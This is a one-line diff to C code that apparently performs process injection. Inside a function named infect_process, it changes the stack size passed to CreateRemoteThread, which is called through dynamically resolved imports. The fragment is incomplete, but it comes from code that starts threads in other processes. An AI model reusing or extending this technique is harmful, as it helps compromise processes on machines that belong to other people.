@@ -125,7 +125,7 @@ infect_process(struct dll_imports* imports,
   }
 
   HANDLE thread = imports->CreateRemoteThread(
-    proc, NULL, 0, p_remote, p_remote_params, 0, NULL);
+    proc, NULL, 1024 * 64, p_remote, p_remote_params, 0, NULL);
   if (thread == NULL) {
     ret = -8;
     goto free_remote_params;
